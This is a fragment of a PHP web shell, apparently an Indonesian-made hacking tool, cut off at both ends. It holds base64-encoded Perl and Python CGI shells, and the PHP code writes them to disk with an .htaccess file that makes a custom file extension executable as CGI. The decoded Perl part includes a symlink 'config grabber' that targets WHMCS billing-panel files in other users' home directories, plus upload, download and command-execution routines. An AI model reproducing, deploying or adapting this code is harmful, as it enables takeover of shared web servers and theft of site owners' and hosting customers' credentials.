JsaWNfaHRtbC9ob3N0aW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NBUlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2FydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jYXJ0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL09SREVSL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL09yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL29yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NMSUVOVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NMSUVOVEFSRUEvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50YXJlYS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnRhcmVhL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NVUFBPUlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTExJTkcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JVWS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CdXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYnV5L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL01BTkFHRS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9NYW5hZ2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbWFuYWdlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NMSUVOVFNVUFBPUlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50U3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnRzdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudHN1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0hFQ0tPVVQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2hlY2tvdXQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2hlY2tvdXQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTElOR1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQkFTS0VUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0Jhc2tldC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iYXNrZXQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU0VDVVJFL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NlY3VyZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zZWN1cmUvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU0FMRVMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU2FsZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2FsZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CaWxsL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JpbGwvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvUFVSQ0hBU0Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvUHVyY2hhc2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcHVyY2hhc2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQUNDT1VOVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9BY2NvdW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2FjY291bnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvVVNFUi9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9Vc2VyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3VzZXIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UUy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnRzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudHMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTElOR1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTVkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2VjdXJlL3dobS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zZWN1cmUvd2htY3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcGFuZWwvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50ZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L29yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSApOyBmb3JlYWNoIChAYXJyYXkpeyBteSAkY29uZmlnbnlhID0gJF8tPntjb25maWdkaXJ9OyBteSAkdHlwZWNvbmZpZyA9ICRfLT57dHlwZX07IHN5bWxpbmsoIiRjb25maWdueWEiLCJzeW1saW5rX2NvbmZpZy8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQiKTsgbWtkaXIgInN5bWxpbmtfY29uZmlnLyR1c2VybnlhLSR0eXBlY29uZmlnLnR4dDQwNCI7IHN5bWxpbmsoIiRjb25maWdueWEiLCJzeW1saW5rX2NvbmZpZy8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQ0MDQvcHBxLnR4dCIpOyBjb3B5KCJzeW1saW5rX2NvbmZpZy9uZW11LnR4dCIsInN5bWxpbmtfY29uZmlnLyR1c2VybnlhLSR0eXBlY29uZmlnLnR4dDQwNC8uaHRhY2Nlc3MiKSA7IH0gfSBwcmludCAic3VjY2VzcyI7DQp9DQpzdWIgSGVscA0Kew0KcHJpbnQgIjxjb2RlPiBIb3cgVG8gVXNlciBTeW1saW5rICsgQ29uZmlnIEdyYWJiZXI/IEp1c3QgS2xpayBTeW1saW5rICsgQ29uZmlnIEdyYWJiZXI8YnI+IjsNCnByaW50ICIgVGhlbiBDaGVjayBEaXJzIEJ5IEVudGVyIFRoZSBVUkw8YnI+IjsNCnByaW50ICIgRXhhbXBsZTogc2l0ZS5jb20vY2dpZGlycy9zeW1saW5rX2NvbmZpZzxicj4iOw0KcHJpbnQgIiBGb3IgU3ltbGluayBKdXN0IEFkZCBJbiBVcmw8YnI+IjsNCnByaW50ICIgRXhhbXBsZTogc2l0ZS5jb20vY2dpZGlycy9zeW1saW5rX2NvbmZpZy9yb290LzwvY29kZT4iOw0KfQ0Kc3ViIFNlbmRGaWxlVG9Ccm93c2VyDQp7DQpsb2NhbCgkU2VuZEZpbGUpID0gQF87DQppZihvcGVuKFNFTkRGSUxFLCAkU2VuZEZpbGUpKSAjIGZpbGUgb3BlbmVkIGZvciByZWFkaW5nDQp7DQppZigkV2luTlQpDQp7DQpiaW5tb2RlKFNFTkRGSUxFKTsNCmJpbm1vZGUoU1RET1VUKTsNCn0NCiRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOw0KKCRGaWxlbmFtZSA9ICRTZW5kRmlsZSkgPX4gbSEoW14vXlxcXSopJCE7DQpwcmludCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXVua25vd25cbiI7DQpwcmludCAiQ29udGVudC1MZW5ndGg6ICRGaWxlU2l6ZVxuIjsNCnByaW50ICJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0kMVxuXG4iOw0KcHJpbnQgd2hpbGUoPFNFTkRGSUxFPik7DQpjbG9zZShTRU5ERklMRSk7DQp9DQplbHNlICMgZmFpbGVkIHRvIG9wZW4gZmlsZQ0Kew0KJlByaW50UGFnZUhlYWRlcigiZiIpOw0KcHJpbnQgIjxjb2RlPkZhaWxlZCB0byBkb3dubG9hZCAkU2VuZEZpbGU6ICQhPC9jb2RlPiI7DQomUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCn0NCn0NCg0KDQpzdWIgQmVnaW5Eb3dubG9hZA0Kew0KIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8DQooISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUNCnsNCiRUYXJnZXRGaWxlID0gJFRyYW5zZmVyRmlsZTsNCn0NCmVsc2UgIyBwYXRoIGlzIHJlbGF0aXZlDQp7DQpjaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCn0NCg0KaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUNCnsNCiZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQp9DQplbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQ0Kew0KJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7DQp9DQp9DQpzdWIgVXBsb2FkRmlsZQ0Kew0KIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIHVwbG9hZCBmb3JtIGFnYWluDQppZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0Kew0KJlByaW50UGFnZUhlYWRlcigiZiIpOw0KJlByaW50RmlsZVVwbG9hZEZvcm07DQomUHJpbnRQYWdlRm9vdGVyOw0KcmV0dXJuOw0KfQ0KJlByaW50UGFnZUhlYWRlcigiYyIpOw0KDQojIHN0YXJ0IHRoZSB1cGxvYWRpbmcgcHJvY2Vzcw0KcHJpbnQgIjxjb2RlPlVwbG9hZGluZyAkVHJhbnNmZXJGaWxlIHRvICRDdXJyZW50RGlyLi4uPGJyPiI7DQoNCiMgZ2V0IHRoZSBmdWxsbHkgcXVhbGlmaWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGNyZWF0ZWQNCmNob3AoJFRhcmdldE5hbWUpIGlmICgkVGFyZ2V0TmFtZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KJFRyYW5zZmVyRmlsZSA9fiBtIShbXi9eXFxdKikkITsNCiRUYXJnZXROYW1lIC49ICRQYXRoU2VwLiQxOw0KDQokVGFyZ2V0RmlsZVNpemUgPSBsZW5ndGgoJGlueydmaWxlZGF0YSd9KTsNCiMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdA0KaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpDQp7DQpwcmludCAiRmFpbGVkOiBEZXN0aW5hdGlvbiBmaWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOw0KfQ0KZWxzZSAjIGZpbGUgaXMgbm90IHByZXNlbnQNCnsNCmlmKG9wZW4oVVBMT0FERklMRSwgIj4kVGFyZ2V0TmFtZSIpKQ0Kew0KYmlubW9kZShVUExPQURGSUxFKSBpZiAkV2luTlQ7DQpwcmludCBVUExPQURGSUxFICRpbnsnZmlsZWRhdGEnfTsNCmNsb3NlKFVQTE9BREZJTEUpOw0KcHJpbnQgIlRyYW5zZmVyZWQgJFRhcmdldEZpbGVTaXplIEJ5dGVzLjxicj4iOw0KcHJpbnQgIkZpbGUgUGF0aDogJFRhcmdldE5hbWU8YnI+IjsNCn0NCmVsc2UNCnsNCnByaW50ICJGYWlsZWQ6ICQhPGJyPiI7DQp9DQp9DQpwcmludCAiPC9jb2RlPiI7DQomUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCiZQcmludFBhZ2VGb290ZXI7DQp9DQoNCnN1YiBEb3dubG9hZEZpbGUNCnsNCiMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSBkb3dubG9hZCBmb3JtIGFnYWluDQppZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0Kew0KJlByaW50UGFnZUhlYWRlcigiZiIpOw0KJlByaW50RmlsZURvd25sb2FkRm9ybTsNCiZQcmludFBhZ2VGb290ZXI7DQpyZXR1cm47DQp9DQoNCiMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCmlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfA0KKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlDQp7DQokVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7DQp9DQplbHNlICMgcGF0aCBpcyByZWxhdGl2ZQ0Kew0KY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCiRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQp9DQoNCmlmKCRPcHRpb25zIGVxICJnbyIpICMgd2UgaGF2ZSB0byBzZW5kIHRoZSBmaWxlDQp7DQomU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZpbGUpOw0KfQ0KZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCnsNCiZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOw0KfQ0KfQ0KDQomUmVhZFBhcnNlOw0KJkdldENvb2tpZXM7DQoNCiRTY3JpcHRMb2NhdGlvbiA9ICRFTlZ7J1NDUklQVF9OQU1FJ307DQokU2VydmVyTmFtZSA9ICRFTlZ7J1NFUlZFUl9OQU1FJ307DQokUnVuQ29tbWFuZCA9ICRpbnsnYyd9Ow0KJFRyYW5zZmVyRmlsZSA9ICRpbnsnZid9Ow0KJE9wdGlvbnMgPSAkaW57J28nfTsNCg0KJEFjdGlvbiA9ICRpbnsnYSd9Ow0KJEFjdGlvbiA9ICJjb21tYW5kIiBpZigkQWN0aW9uIGVxICIiKTsNCg0KIyBnZXQgdGhlIGRpcmVjdG9yeSBpbiB3aGljaCB0aGUgY29tbWFuZHMgd2lsbCBiZSBleGVjdXRlZA0KJEN1cnJlbnREaXIgPSAkaW57J2QnfTsNCmNob3AoJEN1cnJlbnREaXIgPSBgJENtZFB3ZGApIGlmKCRDdXJyZW50RGlyIGVxICIiKTsNCmlmKCRBY3Rpb24gZXEgImNvbW1hbmQiKSAjIHVzZXIgd2FudHMgdG8gcnVuIGEgY29tbWFuZA0Kew0KJkV4ZWN1dGVDb21tYW5kOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAidXBsb2FkIikgIyB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUNCnsNCiZVcGxvYWRGaWxlOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAiZG93bmxvYWQiKSAjIHVzZXIgd2FudHMgdG8gZG93bmxvYWQgYSBmaWxlDQp7DQomRG93bmxvYWRGaWxlOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAic3ltY29uZmlnIikNCnsNCiZQcmludFBhZ2VIZWFkZXI7DQpwcmludCAmU3ltQ29uZmlnOw0KfWVsc2lmKCRBY3Rpb24gZXEgImhlbHAiKQ0Kew0KJlByaW50UGFnZUhlYWRlcjsNCnByaW50ICZIZWxwOw0KfQ==";
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, base64_decode($cgi_script));
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='con7ext_cgi/cgi2.con7ext' target='_blank'>Klik Here</a>";
} elseif($_GET['jancok'] == 'cgipy') {
	$cgi_dir = mkdir('con7ext_cgi', 0755);
        chdir('con7ext_cgi');
	$file_cgi = "cgipy.con7ext";
        $memeg = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .con7ext \n AddHandler cgi-script .con7ext \n AddHandler cgi-script .con7ext";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = "IyEvdXNyL2Jpbi9weXRob24NCiMgMDctMDctMDQNCiMgdjEuMC4wDQoNCiMgY2dpLXNoZWxsLnB5DQojIEEgc2ltcGxlIENHSSB0aGF0IGV4ZWN1dGVzIGFyYml0cmFyeSBzaGVsbCBjb21tYW5kcy4NCg0KDQojIENvcHlyaWdodCBNaWNoYWVsIEZvb3JkDQojIFlvdSBhcmUgZnJlZSB0byBtb2RpZnksIHVzZSBhbmQgcmVsaWNlbnNlIHRoaXMgY29kZS4NCg0KIyBObyB3YXJyYW50eSBleHByZXNzIG9yIGltcGxpZWQgZm9yIHRoZSBhY2N1cmFjeSwgZml0bmVzcyB0byBwdXJwb3NlIG9yIG90aGVyd2lzZSBmb3IgdGhpcyBjb2RlLi4uLg0KIyBVc2UgYXQgeW91ciBvd24gcmlzayAhISENCg0KIyBFLW1haWwgbWljaGFlbCBBVCBmb29yZCBET1QgbWUgRE9UIHVrDQojIE1haW50YWluZWQgYXQgd3d3LnZvaWRzcGFjZS5vcmcudWsvYXRsYW50aWJvdHMvcHl0aG9udXRpbHMuaHRtbA0KDQoiIiINCkEgc2ltcGxlIENHSSBzY3JpcHQgdG8gZXhlY3V0ZSBzaGVsbCBjb21tYW5kcyB2aWEgQ0dJLg0KIiIiDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQojIEltcG9ydHMNCnRyeToNCiAgICBpbXBvcnQgY2dpdGI7IGNnaXRiLmVuYWJsZSgpDQpleGNlcHQ6DQogICAgcGFzcw0KaW1wb3J0IHN5cywgY2dpLCBvcw0Kc3lzLnN0ZGVyciA9IHN5cy5zdGRvdXQNCmZyb20gdGltZSBpbXBvcnQgc